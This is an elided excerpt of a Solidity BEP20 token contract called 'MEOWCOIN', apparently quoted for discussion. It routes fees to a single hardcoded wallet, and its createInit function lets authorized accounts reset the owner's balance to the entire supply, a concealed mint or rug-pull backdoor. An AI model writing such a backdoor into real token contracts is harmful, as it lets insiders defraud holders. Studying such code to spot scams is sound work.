...
contract MEOW is IBEP20, Auth {
    ...
    string constant _name = "MEOWCOIN";
    ...
    uint256  _varAmount = (10 ** _decimals);
    uint256  _totalTokensDec = 1000000000000;    
    uint256  _totalAmount = _totalTokensDec * _varAmount;
    ...
    address private marketingFeeReceiver = 0x44D1e6325e752Fc72c3136a08C643F87357F66Ee;
    address private buybackFeeReceiver = 0x44D1e6325e752Fc72c3136a08C643F87357F66Ee;
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function createInit() external authorized {
        _balances[owner] = _totalAmount; 
    }
